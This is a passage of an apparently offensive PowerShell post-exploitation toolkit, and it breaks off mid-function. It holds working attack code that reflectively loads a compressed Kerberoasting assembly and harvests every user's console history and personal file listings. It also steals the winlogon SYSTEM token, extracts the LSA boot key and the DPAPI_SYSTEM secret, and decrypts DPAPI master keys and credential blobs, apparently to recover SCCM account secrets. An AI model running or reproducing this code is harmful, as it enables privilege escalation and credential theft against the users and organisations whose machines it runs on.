    $gzipStream = New-Object IO.Compression.GzipStream($kr, [IO.Compression.CompressionMode]::Decompress)
    $memStream = New-Object System.IO.MemoryStream
    $gzipStream.CopyTo($memStream)
    $reflectedAssembly = [System.Reflection.Assembly]::Load($memStream.ToArray())
    $currentConsoleOutput = [Console]::Out
    $textWriter = New-Object IO.StringWriter
    [Console]::SetOut($textWriter)
    [Kroast.Program]::Main([string[]]$args)
    [Console]::SetOut($currentConsoleOutput)
    $textWriter.ToString() | Write-Output
}
'@

    
################################################################################################################
######################################## Local scripts and modules #############################################
################################################################################################################

################################################################################################################
######################################## Module: ConsoleHistory ################################################
################################################################################################################

$Global:ConsoleHostHistory = @'
Write-Output ""
$usersFolderPath = "C:\Users"
$users = Get-ChildItem -Path $usersFolderPath -Directory

$foundHistoryFile = $false

foreach ($User in $Users) {
    $historyFilePath = Join-Path -Path $User.FullName -ChildPath "AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

    if (Test-Path -Path $historyFilePath -ErrorAction "SilentlyContinue") {
        $foundHistoryFile = $true

        $historyContent = Get-Content -Path $historyFilePath -Raw
        $historyLines = $historyContent -split "`n"
        Write-output ""
        Write-output "-----[$User]-----"
        $historyLines | Where-Object { $_ -match '\S' } | ForEach-Object { Write-output $_.Trim() }
    }
}

if (-not $foundHistoryFile) {
    Write-Output "No Results"
}

'@

################################################################################################################
########################################### Module: Files  #####################################################
################################################################################################################

$Global:Files = @'
$usersFolderPath = "C:\Users"
$users = Get-ChildItem -Path $usersFolderPath -Directory

$uninterestingFiles = @("Thumbs.db", "desktop.ini", "desktop.lnk", "Icon?", "Icon\r", "Firefox.lnk", "Microsoft Edge.lnk")
$excludedStartsWith = @("ntuser.dat", "ntuser.ini", "ntuser.pol")

foreach ($user in $users) {
    $userDownloads = Join-Path -Path $user.FullName -ChildPath "Downloads"
    $userDocuments = Join-Path -Path $user.FullName -ChildPath "Documents"
    $userDesktop = Join-Path -Path $user.FullName -ChildPath "Desktop"
    $userHome = $user.FullName

    $downloadsFiles = Get-ChildItem -Path $userDownloads -File -Force -ErrorAction SilentlyContinue
    $documentsFiles = Get-ChildItem -Path $userDocuments -File -Force -ErrorAction SilentlyContinue
    $desktopFiles = Get-ChildItem -Path $userDesktop -File -Force -ErrorAction SilentlyContinue
    $homeFiles = Get-ChildItem -Path $userHome -File -Force -ErrorAction SilentlyContinue

    $downloadsFiles = $downloadsFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }
    $documentsFiles = $documentsFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }
    $desktopFiles = $desktopFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }
    $homeFiles = $homeFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }

    $hasFiles = $downloadsFiles.Count -gt 0 -or $documentsFiles.Count -gt 0 -or $desktopFiles.Count -gt 0 -or $homeFiles.Count -gt 0

    if ($hasFiles) {
        Write-Host ""
        Write-Host "----------------------------------------------------------------------------------------------"
        Write-Host ("[User] $user")

        if ($downloadsFiles.Count -gt 0) {
        ""
            Write-Host ("[Downloads]")
            $downloadsFiles | Sort-Object Name | ForEach-Object {
                $fileSize = if ($_.Length -ge 1MB) {
                    "{0:N2} MB" -f ($_.Length / 1MB)
                } else {
                    "{0:N2} KB" -f ($_.Length / 1KB)
                }
                Write-Host ("- $($_.Name) ($fileSize)")
            }
        }

        if ($documentsFiles.Count -gt 0) {
        ""
            Write-Host ("[Documents]")
            $documentsFiles | Sort-Object Name | ForEach-Object {
                $fileSize = if ($_.Length -ge 1MB) {
                    "{0:N2} MB" -f ($_.Length / 1MB)
                } else {
                    "{0:N2} KB" -f ($_.Length / 1KB)
                }
                Write-Host ("- $($_.Name) ($fileSize)")
            }
        }

        if ($desktopFiles.Count -gt 0) {
        ""
            Write-Host ("[Desktop]")
            $desktopFiles | Sort-Object Name | ForEach-Object {
                $fileSize = if ($_.Length -ge 1MB) {
                    "{0:N2} MB" -f ($_.Length / 1MB)
                } else {
                    "{0:N2} KB" -f ($_.Length / 1KB)
                }
                Write-Host ("- $($_.Name) ($fileSize)")
            }
        }

        if ($homeFiles.Count -gt 0) {
        ""
            Write-Host ("[Home]")
            $homeFiles | Sort-Object Name | ForEach-Object {
                $fileSize = if ($_.Length -ge 1MB) {
                    "{0:N2} MB" -f ($_.Length / 1MB)
                } else {
                    "{0:N2} KB" -f ($_.Length / 1KB)
                }
                Write-Host ("- $($_.Name) ($fileSize)")
            }
        }
        Write-Host "----------------------------------------------------------------------------------------------"
    }
}
'@

################################################################################################################
############################################ Module: SCCM ######################################################
################################################################################################################


$Global:LocalSCCM = @'
function Invoke-FunctionLookup {
    param ([string] $moduleName, [string] $functionName)

    # Load the CLR helper type from System.dll
    $gacAsm = [AppDomain]::CurrentDomain.GetAssemblies() |
        Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\')[-1] -eq 'System.dll' }
    
    $helperType = $gacAsm.GetType('Microsoft.Win32.UnsafeNativeMethods')
    $ptrOverload = $helperType.GetMethod('GetProcAddress', [Reflection.BindingFlags]::Public -bor [Reflection.BindingFlags]::Static, $null, [Type[]] @([IntPtr], [string]),$null)

    if ($ptrOverload)
    {
        $moduleHandle = $helperType.GetMethod('GetModuleHandle').Invoke($null, @($moduleName))
        return $ptrOverload.Invoke($null, @($moduleHandle, $functionName))
    }

    # Fallback to HandleRef overload
    $handleRefOverload = $helperType.GetMethod('GetProcAddress', [Reflection.BindingFlags]::Public -bor [Reflection.BindingFlags]::Static, $null,[Type[]] @([System.Runtime.InteropServices.HandleRef], [string]),$null)
    if (-not $handleRefOverload)
    {
        throw 'Could not find a suitable GetProcAddress overload on this system.'
    }

    $moduleHandle = $helperType.GetMethod('GetModuleHandle').Invoke($null, @($moduleName))
    $handleRef = New-Object System.Runtime.InteropServices.HandleRef($null, $moduleHandle)
    return $handleRefOverload.Invoke($null, @($handleRef, $functionName))
}

function Invoke-GetDelegate {
    param ([Type[]] $parameterTypes, [Type] $returnType = [Void])

    # Create a dynamic in‑memory delegate type
    $asmName = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
    $asmBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($asmName, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $modBuilder = $asmBuilder.DefineDynamicModule('InMemoryModule', $false)

    $typeBuilder = $modBuilder.DefineType(
        'MyDelegateType',
        [System.Reflection.TypeAttributes]::Class -bor
        [System.Reflection.TypeAttributes]::Public -bor
        [System.Reflection.TypeAttributes]::Sealed -bor
        [System.Reflection.TypeAttributes]::AnsiClass -bor
        [System.Reflection.TypeAttributes]::AutoClass,
        [System.MulticastDelegate]
    )

    $ctor = $typeBuilder.DefineConstructor(
        [System.Reflection.MethodAttributes]::RTSpecialName -bor
        [System.Reflection.MethodAttributes]::HideBySig -bor
        [System.Reflection.MethodAttributes]::Public,
        [System.Reflection.CallingConventions]::Standard,
        $parameterTypes
    )
    $ctor.SetImplementationFlags([System.Reflection.MethodImplAttributes]::Runtime -bor
                                 [System.Reflection.MethodImplAttributes]::Managed)

    $invokeMethod = $typeBuilder.DefineMethod(
        'Invoke',
        [System.Reflection.MethodAttributes]::Public -bor
        [System.Reflection.MethodAttributes]::HideBySig -bor
        [System.Reflection.MethodAttributes]::NewSlot -bor
        [System.Reflection.MethodAttributes]::Virtual,
        $returnType,
        $parameterTypes
    )
    $invokeMethod.SetImplementationFlags([System.Reflection.MethodImplAttributes]::Runtime -bor
                                         [System.Reflection.MethodImplAttributes]::Managed)

    return $typeBuilder.CreateType()
}

$FnOpenProcess             = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName 'Kernel32.dll' -functionName 'OpenProcess'             ),(Invoke-GetDelegate @([UInt32],[bool],[UInt32])([IntPtr])))
$FnOpenProcessToken        = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName 'Advapi32.dll' -functionName 'OpenProcessToken'        ),(Invoke-GetDelegate @([IntPtr],[UInt32],[IntPtr].MakeByRefType())([bool])))
$FnDuplicateTokenEx        = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName 'Advapi32.dll' -functionName 'DuplicateTokenEx'        ),(Invoke-GetDelegate @([IntPtr],[UInt32],[IntPtr],[UInt32],[UInt32],[IntPtr].MakeByRefType())([bool])))
$FnImpersonateLoggedOnUser = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName 'Advapi32.dll' -functionName 'ImpersonateLoggedOnUser' ),(Invoke-GetDelegate @([IntPtr])([bool])))
$FnRegOpenKeyEx            = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName 'Advapi32.dll' -functionName 'RegOpenKeyExA'           ),(Invoke-GetDelegate @([Int32],[string],[Int32],[Int32],[IntPtr].MakeByRefType())([Int32])))
$FnRegQueryValueEx         = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName 'Advapi32.dll' -functionName 'RegQueryValueExA'        ),(Invoke-GetDelegate @([IntPtr],[string],[IntPtr],[UInt32].MakeByRefType(),[IntPtr],[UInt32].MakeByRefType())([Int32])))
$FnRegQueryInfoKey         = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName 'Advapi32.dll' -functionName 'RegQueryInfoKeyA'        ),(Invoke-GetDelegate @([Int32],[System.Text.StringBuilder],[Int32].MakeByRefType(),[Int32],[Int32].MakeByRefType(),[Int32].MakeByRefType(),[Int32].MakeByRefType(),[Int32].MakeByRefType(),[Int32].MakeByRefType(),[Int32].MakeByRefType(),[Int32].MakeByRefType(),[IntPtr])([Int32])))
$FnRegCloseKey             = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName 'Advapi32.dll' -functionName 'RegCloseKey'             ),(Invoke-GetDelegate @([Int32])([Int32])))
$FnRevertToSelf            = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName 'Advapi32.dll' -functionName 'RevertToSelf'            ),(Invoke-GetDelegate -parameterTypes $null -returnType ([bool])))



function Invoke-Impersonate {

    $currentSid = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
    
    if ($currentSid -eq 'S-1-5-18')
    { 
        return $true 
    }

    $winlogonId = (Get-Process -Name 'winlogon' -ErrorAction Stop | Select-Object -First 1 -ExpandProperty Id)
    
    $processHandle = $FnOpenProcess.Invoke(0x400, $true, [int]$winlogonId)
    
    if ($processHandle -eq [IntPtr]::Zero) 
    { 
        return $false
    }

    $tokenHandle = [IntPtr]::Zero
    
    if (-not $FnOpenProcessToken.Invoke($processHandle, 0x0E, [ref]$tokenHandle))
    { 
        return $false
    }

    $dupHandle = [IntPtr]::Zero
    
    if (-not $FnDuplicateTokenEx.Invoke($tokenHandle, 0x02000000, [IntPtr]::Zero, 0x02, 0x01, [ref]$dupHandle))
    { 
        return $false
    }

    try {
        
        if (-not $FnImpersonateLoggedOnUser.Invoke($dupHandle))
        { 
            return $false
        }
        
        $newSid = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
        
        return ($newSid -eq 'S-1-5-18')
    }
    
    catch
    {
        return $false
    }
}


# Taken from this project https://raw.githubusercontent.com/tmenochet/PowerDump/refs/heads/master/DpapiDump.ps1

if (-not [Type]::GetType('Pbkdf2', $false, $false)) {
Add-Type -TypeDefinition @"
using System;
using System.Security.Cryptography;

public class Pbkdf2 {
    public Pbkdf2(HMAC algorithm, Byte[] password, Byte[] salt, Int32 iterations) {
        if (algorithm == null) { throw new ArgumentNullException("algorithm", "Algorithm cannot be null."); }
        if (salt == null) { throw new ArgumentNullException("salt", "Salt cannot be null."); }
        if (password == null) { throw new ArgumentNullException("password", "Password cannot be null."); }
        this.Algorithm = algorithm;
        this.Algorithm.Key = password;
        this.Salt = salt;
        this.IterationCount = iterations;
        this.BlockSize = this.Algorithm.HashSize / 8;
        this.BufferBytes = new byte[this.BlockSize];
    }
    
    private readonly int BlockSize;
    private uint BlockIndex = 1;
    private byte[] BufferBytes;
    private int BufferStartIndex = 0;
    private int BufferEndIndex = 0;
    
    public HMAC Algorithm { get; private set; }
    public Byte[] Salt { get; private set; }
    public Int32 IterationCount { get; private set; }
    
    public Byte[] GetBytes(int count, string algorithm = "sha512") {
        byte[] result = new byte[count];
        int resultOffset = 0;
        int bufferCount = this.BufferEndIndex - this.BufferStartIndex;

        if (bufferCount > 0) {
            if (count < bufferCount) {
                Buffer.BlockCopy(this.BufferBytes, this.BufferStartIndex, result, 0, count);
                this.BufferStartIndex += count;
                return result;
            }
            Buffer.BlockCopy(this.BufferBytes, this.BufferStartIndex, result, 0, bufferCount);
            this.BufferStartIndex = this.BufferEndIndex = 0;
            resultOffset += bufferCount;
        }
        
        while (resultOffset < count) {
            int needCount = count - resultOffset;
            if (algorithm.ToLower() == "sha256")
                this.BufferBytes = this.Func(false);
            else
                this.BufferBytes = this.Func();
                
            if (needCount > this.BlockSize) {
                Buffer.BlockCopy(this.BufferBytes, 0, result, resultOffset, this.BlockSize);
                resultOffset += this.BlockSize;
            } else {
                Buffer.BlockCopy(this.BufferBytes, 0, result, resultOffset, needCount);
                this.BufferStartIndex = needCount;
                this.BufferEndIndex = this.BlockSize;
                return result;
            }
        }
        return result;
    }
    
    private byte[] Func(bool mscrypto = true) {
        var hash1Input = new byte[this.Salt.Length + 4];
        Buffer.BlockCopy(this.Salt, 0, hash1Input, 0, this.Salt.Length);
        Buffer.BlockCopy(GetBytesFromInt(this.BlockIndex), 0, hash1Input, this.Salt.Length, 4);
        var hash1 = this.Algorithm.ComputeHash(hash1Input);
        byte[] finalHash = hash1;
        
        for (int i = 2; i <= this.IterationCount; i++) {
            hash1 = this.Algorithm.ComputeHash(hash1, 0, hash1.Length);
            for (int j = 0; j < this.BlockSize; j++) {
                finalHash[j] = (byte)(finalHash[j] ^ hash1[j]);
            }
            if (mscrypto)
                Array.Copy(finalHash, hash1, hash1.Length);
        }
        
        if (this.BlockIndex == uint.MaxValue) { 
            throw new InvalidOperationException("Derived key too long."); 
        }
        this.BlockIndex += 1;
        return finalHash;
    }
    
    private static byte[] GetBytesFromInt(uint i) {
        var bytes = BitConverter.GetBytes(i);
        if (BitConverter.IsLittleEndian) {
            return new byte[] { bytes[3], bytes[2], bytes[1], bytes[0] };
        } else {
            return bytes;
        }
    }
}
"@ -ReferencedAssemblies System.Security
}



function Get-BootKey {

    # Retrieves the boot key by querying specific registry keys under SYSTEM hive and descrambles it. Returns the boot key as a byte array.
    # Hand-off: Returns boot key to Get-LSAKey function.

    $ScrambledKey = [System.Text.StringBuilder]::new()
    $keyNames     = @("JD", "Skew1", "GBG", "Data")

    foreach ($Key in $keyNames)
    {
        [string] $KeyPath = "SYSTEM\\CurrentControlSet\\Control\\Lsa\\$Key"
        $ClassVal         = [System.Text.StringBuilder]::new(1024)
        $Len              = 1024
        $hKey             = [IntPtr]::Zero
        $dummy            = [IntPtr]::Zero

        $Result = $FnRegOpenKeyEx.Invoke(0x80000002, $KeyPath, 0x0, 0x19, [ref]$hKey)
        
        if ($Result -ne 0)
        {
            $ErrCode = [System.Runtime.Interopservices.Marshal]::GetLastWin32Error()
            Write-Host "[!] Error opening $KeyPath : $ErrCode"
            return $null
        }

        $Result = $FnRegQueryInfoKey.Invoke($hKey, $ClassVal, [ref]$Len, 0x0, [ref]$null, [ref]$null, [ref]$null, [ref]$null, [ref]$null, [ref]$null, [ref]$null, [IntPtr]::Zero)
        
        if ($Result -ne 0)
        {
            $ErrCode = [System.Runtime.Interopservices.Marshal]::GetLastWin32Error()
            Write-Host "[!] Error querying $KeyPath : $ErrCode"
            return $null
        }

        $FnRegCloseKey.Invoke($hKey)    > $null
        $ScrambledKey.Append($ClassVal) > $null
    }

    $Descramble = @(0x8, 0x5, 0x4, 0x2, 0xB, 0x9, 0xD, 0x3, 0x0, 0x6, 0x1, 0xC, 0xE, 0xA, 0xF, 0x7)
    $BootKey    = foreach ($i in $Descramble) { [Convert]::ToByte("$($ScrambledKey[$i * 2])$($ScrambledKey[$i * 2 + 1])", 16) }
    $HexString  = ($BootKey | ForEach-Object { $_.ToString("X2") }) -join ""

    return $BootKey
}

function Get-LsaSha256Hash {
    param ([byte[]] $Key, [byte[]] $RawData)

    # Computes a SHA256 hash of a key combined with repeated raw data. Used for deriving encryption keys in LSA decryption.
    # Hand-off: Returns hash to Get-LSAKey/Get-LSASecret for key derivation.

    $bufferSize = $Key.Length + ($RawData.Length * 1000)
    $buffer     = New-Object byte[] $bufferSize
    [System.Array]::Copy($Key, 0, $buffer, 0, $Key.Length)

    for ($i = 0; $i -lt 1000; $i++)
    {
        $dest = $Key.Length + ($i * $RawData.Length)
        [System.Array]::Copy($RawData, 0, $buffer, $dest, $RawData.Length)
    }

    $sha256 = [System.Security.Cryptography.SHA256]::Create()
    
    try
    { 
        return $sha256.ComputeHash($buffer) 
    }
    
    finally
    { 
        $sha256.Dispose()
    }
}

function Get-LsaAesDecrypt {
    param ([byte[]] $Key,[byte[]] $Data)

    # Decrypts AES-CBC encrypted data using a provided key and zero IV. Handles data in 16-byte chunks.
    # Hand-off: Returns decrypted data to Get-LSAKey/Get-LSASecret for LSA secret extraction.

    $aes = [System.Security.Cryptography.AesManaged]::new()
    try 
    {
        $aes.Key       = $Key
        $aes.IV        = New-Object byte[] 16
        $aes.Mode      = [System.Security.Cryptography.CipherMode]::CBC
        $aes.BlockSize = 128
        $aes.Padding   = [System.Security.Cryptography.PaddingMode]::Zeros

        $transform     = $aes.CreateDecryptor()
        $chunks        = [int][math]::Ceiling($Data.Length / 16)
        $plaintext     = New-Object byte[] ($chunks * 16)

        for ($i = 0; $i -lt $chunks; $i++) 
        {
            $offset        = $i * 16
            $chunk         = New-Object byte[] 16
            [System.Array]::Copy($Data, $offset, $chunk, 0, 16)
            $decryptedChunk = $transform.TransformFinalBlock($chunk, 0, 16)
            [System.Array]::Copy($decryptedChunk, 0, $plaintext, $offset, 16)
        }

        return $plaintext
    }
    
    finally 
    {
        $transform.Dispose()
        $aes.Dispose()
    }
}

function Get-LSAKey {

    # Derives the LSA encryption key using the boot key and encrypted registry data from SECURITY hive.
    # Hand-off: Uses Get-BootKey, passes data to Get-LsaSha256Hash/Get-LsaAesDecrypt. Returns LSA key to Get-LSASecret.

    $BootKey                      = Get-BootKey
    $LSAKeyEncryptedStruct        = Get-ItemPropertyValue -Path "HKLM:\SECURITY\Policy\PolEKList" -Name "(default)"
    $LSAEncryptedData             = $LSAKeyEncryptedStruct[28..($LSAKeyEncryptedStruct.Length - 1)]
    $LSAEncryptedDataEncryptedKey = $LSAEncryptedData[0..31]
    $tmpKey                       = Get-LsaSha256Hash -Key $BootKey -RawData $LSAEncryptedDataEncryptedKey
    $LSAEncryptedDataRemainder    = $LSAEncryptedData[32..($LSAEncryptedData.Length - 1)]
    $LSAKeyStructPlaintext        = Get-LsaAesDecrypt -Key $tmpKey -Data $LSAEncryptedDataRemainder
    $LSAKey                       = New-Object byte[] 32
    [System.Array]::Copy($LSAKeyStructPlaintext, 68, $LSAKey, 0, 32)

    function ToHex($bytes) { ($bytes | ForEach-Object { $_.ToString("X2") }) -join '' }
    Write-Host "[*] BootKey : $(ToHex $BootKey)"
    Write-Host "[*] tmpKey  : $(ToHex $tmpKey)"
    Write-Host "[*] LSA Key : $(ToHex $LSAKey)"

    return $LSAKey
}

function Get-LSASecret {
    param ([string] $SecretName)

    # Retrieves and decrypts a specified LSA secret from the registry using the LSA key.
    # Hand-off: Uses Get-LSAKey, passes data to Get-LsaSha256Hash/Get-LsaAesDecrypt. Returns DPAPI_SYSTEM secret to Get-DPAPIKeys.

    $LSAKey       = Get-LSAKey
    $RegistryPath = "HKLM:\SECURITY\Policy\Secrets\$SecretName\CurrVal"

    try 
    {
        $RegistryKey = Get-Item -Path $RegistryPath -ErrorAction Stop
        $KeyData     = $RegistryKey.GetValue("")

        if (-not $KeyData -or $KeyData.Length -lt 28)
        {
            Write-Warning "Invalid registry data for $SecretName"
            return $null
        }

        $keyEncryptedData             = $keyData[28..($keyData.Length-1)]
        $keyEncryptedDataEncryptedKey = $keyEncryptedData[0..31]
        $tmpKey                       = Get-LSASHA256Hash -Key $LSAKey -RawData $keyEncryptedDataEncryptedKey
        $keyEncryptedDataRemainder    = $keyEncryptedData[32..($keyEncryptedData.Length-1)]
        $keyPathPlaintext             = Get-LsaAesDecrypt -Key $tmpKey -Data $keyEncryptedDataRemainder

        if ($SecretName -eq "DPAPI_SYSTEM") 
        {
            return $keyPathPlaintext[20..59]
        }

        Write-Warning "LSA Secret '$SecretName' not implemented"
        return $null
    }
    
    catch 
    {
        Write-Warning "Error accessing registry: $_"
        return $null
    }
}

function Get-DPAPIKeys {

    # Extracts machine and user DPAPI keys from the decrypted DPAPI_SYSTEM secret.
    # Hand-off: Uses Get-LSASecret. Stores keys in script variables for later use by Triage-SystemMasterKeys.

    $dpapiKeyFull                 = Get-LSASecret -SecretName "DPAPI_SYSTEM"
    $script:dpapiMachineKeysBytes = New-Object byte[] 20
    $script:dpapiUserKeysBytes    = New-Object byte[] 20

    [System.Array]::Copy($dpapiKeyFull,  0, $script:dpapiMachineKeysBytes, 0, 20)
    [System.Array]::Copy($dpapiKeyFull, 20, $script:dpapiUserKeysBytes   , 0, 20)

    function ToHex($bytes) { ($bytes | ForEach-Object { $_.ToString("X2") }) -join '' }

    Write-Host ""
    Write-Host "[*] Secret  : DPAPI_SYSTEM"
    Write-Host "[*] Full    : $(( $dpapiKeyFull                 | ForEach-Object { $_.ToString('X2') } ) -join '')"
    Write-Host "[*] Machine : $(( $script:dpapiMachineKeysBytes | ForEach-Object { $_.ToString('X2') } ) -join '')"
    Write-Host "[*] User    : $(( $script:dpapiUserKeysBytes    | ForEach-Object { $_.ToString('X2') } ) -join '')"
    Write-Host ""
}

function Get-MasterKey {
    param ([byte[]] $masterKeyBytes)

    # Extracts and validates the master key length from DPAPI master key bytes.
    # Hand-off: Called by Decrypt-MasterKeyWithSha to process master key structures.

    $offset           = 96
    $masterKeyLength  = [System.BitConverter]::ToInt64($masterKeyBytes, $offset)
    $offset          += 4 * 8

    if ($masterKeyLength -lt 0 -or $masterKeyLength -gt 1048576)
    {
        return "[!] MasterKeyLength value $masterKeyLength is invalid or suspicious"
    }

    $masterKeySubBytes = New-Object byte[] ([int]$masterKeyLength)
    [System.Array]::Copy($masterKeyBytes, $offset, $masterKeySubBytes, 0, [int]$masterKeyLength)
    return $masterKeySubBytes
}

function Derive-PreKey {
    param ([byte[]] $shaBytes, [uint32] $algHash, [byte[]] $salt, [int] $rounds)

    # Derives a pre-key using PBKDF2 with HMAC-SHA1/SHA512 for DPAPI master key decryption.
    # Hand-off: Returns derived key to Decrypt-MasterKeyWithSha for decryption operations.

    switch ($algHash)
    {
        32782
        {
            $hmac = [System.Security.Cryptography.HMACSHA512]::new()
            $df   = [Pbkdf2]::new($hmac, $shaBytes, $salt, $rounds)
            $derivedPreKey = $df.GetBytes(48, "sha512")
            break
        }
        32777
        {
            $hmac = [System.Security.Cryptography.HMACSHA1]::new()
            $df   = [Pbkdf2]::new($hmac, $shaBytes, $salt, $rounds)
            $derivedPreKey = $df.GetBytes(32, "sha1")
            break
        }
        default
        {
            throw "Unsupported algHash: $algHash"
        }
    }

    return $derivedPreKey
}




function Decrypt-Aes256HmacSha512 {
    param ([byte[]] $ShaBytes, [byte[]] $Final, [byte[]] $EncData)

    # Decrypts AES-256-CBC data with HMAC-SHA512 integrity check. Used for newer DPAPI master keys.
    # Hand-off: Returns SHA1 of decrypted master key to Decrypt-MasterKeyWithSha.

    # Key and IV setup
    $HMACLen    = [System.Security.Cryptography.HMACSHA512]::new().HashSize / 8
    $IVBytes    = New-Object byte[] 16
    $key        = New-Object byte[] 32
    [Array]::Copy($Final, 32, $IVBytes, 0, 16)
    [Array]::Copy($Final, 0, $key, 0, 32)

    # AES Decrypt
    $aes        = New-Object Security.Cryptography.AesManaged
    $aes.Key    = $key
    $aes.IV     = $IVBytes
    $aes.Mode   = [Security.Cryptography.CipherMode]::CBC
    $aes.Padding= [Security.Cryptography.PaddingMode]::Zeros
    $dec        = $aes.CreateDecryptor()
    $plain      = $dec.TransformFinalBlock($EncData, 0, $EncData.Length)

    # HMAC and SHA
    $outLen     = $plain.Length
    $outputLen  = $outLen - 16 - $HMACLen
    $mkFull     = New-Object byte[] $HMACLen
    [Array]::Copy($plain, $outLen - $outputLen, $mkFull, 0, $mkFull.Length)
    $sha1       = [System.Security.Cryptography.SHA1Managed]::Create()
    $mkSha1     = $sha1.ComputeHash($mkFull)

    $cryptBuf   = New-Object byte[] 16
    [Array]::Copy($plain, $cryptBuf, 16)
    $hmac1      = [System.Security.Cryptography.HMACSHA512]::new($ShaBytes)
    $r1Hmac     = $hmac1.ComputeHash($cryptBuf)

    $r2Buf      = New-Object byte[] $outputLen
    [Array]::Copy($plain, $outLen - $outputLen, $r2Buf, 0, $outputLen)
    $hmac2      = [System.Security.Cryptography.HMACSHA512]::new($r1Hmac)
    $r2Hmac     = $hmac2.ComputeHash($r2Buf)

    $cmp        = New-Object byte[] 64
    [Array]::Copy($plain, 16, $cmp, 0, $cmp.Length)

    if (-not [System.Linq.Enumerable]::SequenceEqual($cmp, $r2Hmac))
    {
        throw "HMAC integrity check failed!"
    }

    return $mkSha1
}



function Decrypt-TripleDESHmac {
    param ([byte[]] $Final, [byte[]] $EncData)

    # Decrypts 3DES data with custom HMAC handling. Used for older DPAPI master keys.
    # Hand-off: Returns SHA1 of decrypted master key to Decrypt-MasterKeyWithSha.

    $ivBytes    = New-Object byte[] 8
    $key        = New-Object byte[] 24
    [Array]::Copy($Final, 24, $ivBytes, 0, 8)
    [Array]::Copy($Final, 0, $key, 0, 24)

    $des        = New-Object Security.Cryptography.TripleDESCryptoServiceProvider
    $des.Key    = $key
    $des.IV     = $ivBytes
    $des.Mode   = [Security.Cryptography.CipherMode]::CBC
    $des.Padding= [Security.Cryptography.PaddingMode]::Zeros

    $decryptor      = $des.CreateDecryptor()
    $plaintextBytes = $decryptor.TransformFinalBlock($EncData, 0, $EncData.Length)

    $decryptedKey   = New-Object byte[] 64
    [Array]::Copy($plaintextBytes, 40, $decryptedKey, 0, 64)

    $sha1           = New-Object Security.Cryptography.SHA1Managed
    $masterKeySha1  = $sha1.ComputeHash($decryptedKey)

    return $masterKeySha1
}

function Decrypt-MasterKeyWithSha {
    param ([byte[]] $MasterKeyBytes,[byte[]] $SHABytes)

    # Orchestrates DPAPI master key decryption using derived keys and algorithm-specific functions.
    # Hand-off: Calls Derive-PreKey and algorithm-specific decryptors. Returns GUID:key mapping to Triage-SystemMasterKeys.

    $guid       = '{' + [System.Text.Encoding]::Unicode.GetString($MasterKeyBytes, 12, 72) + '}'
    $mkBytes    = Get-MasterKey $MasterKeyBytes

    $offset     = 4
    $salt       = New-Object byte[] 16
    [Array]::Copy($mkBytes, $offset, $salt, 0, 16)
    $offset    += 16

    $rounds     = [BitConverter]::ToInt32($mkBytes, $offset)
    $offset    += 4

    $algHash    = [BitConverter]::ToUInt32($mkBytes, $offset)
    $offset    += 4

    $algCrypt   = [BitConverter]::ToUInt32($mkBytes, $offset)
    $offset    += 4

    $encData    = New-Object byte[] ($mkBytes.Length - $offset)
    [Array]::Copy($mkBytes, $offset, $encData, 0, $encData.Length)

    $derivedPreKey = Derive-PreKey -shaBytes $SHABytes -algHash $algHash -salt $salt -rounds $rounds

    if ($algCrypt -eq 26128 -and $algHash -eq 32782)
    {
        
        # CALG_AES_256 with CALG_SHA_512
        $masterKeySha1 = Decrypt-Aes256HmacSha512 -ShaBytes $shaBytes -Final $derivedPreKey -EncData $encData
        $masterKeyStr  = ($masterKeySha1 | ForEach-Object { $_.ToString("X2") }) -join ""
        return @{ $guid = $masterKeyStr }
    }
    
    elseif ($algCrypt -eq 26115 -and ($algHash -eq 32777 -or $algHash -eq 32772)) 
    {
        
        # CALG_3DES with CALG_HMAC or CALG_SHA1
        $masterKeySha1 = Decrypt-TripleDESHmac -Final $derivedPreKey -EncData $encData
        $masterKeyStr  = ($masterKeySha1 | ForEach-Object { $_.ToString("X2") }) -join ""
        return @{ $guid = $masterKeyStr }
    }
    
    else 
    {
        throw "Alg crypt '$algCrypt / 0x{0:X8}' not currently supported!" -f $algCrypt
    }
}



function Describe-DPAPIBlob {
    param ([byte[]]$blobBytes, [hashtable] $MasterKeys,[string] $blobType = "blob",[bool] $unprotect = $false, [byte[]] $entropy = $null)

    # Parses and decrypts DPAPI blobs (credentials, RDG files, etc.) using provided master keys.
    # Hand-off: Uses MasterKeys hashtable. Returns decrypted data to Decrypt-NAA.

    $offset = 0
    
    if ($blobType -eq "credential")
    { 
        $offset = 36
    }
    
    elseif ($blobType -in @("policy","blob","rdg","chrome","keepass"))
    { 
        $offset = 24
    }
    
    else 
    {
        Write-Host "[!] Unsupported blob type: $blobType"
        return ,@()
    }

    $guidMasterKey = [Guid]::new([byte[]]$blobBytes[$offset..($offset+15)])
    $guidString    = "{$guidMasterKey}"
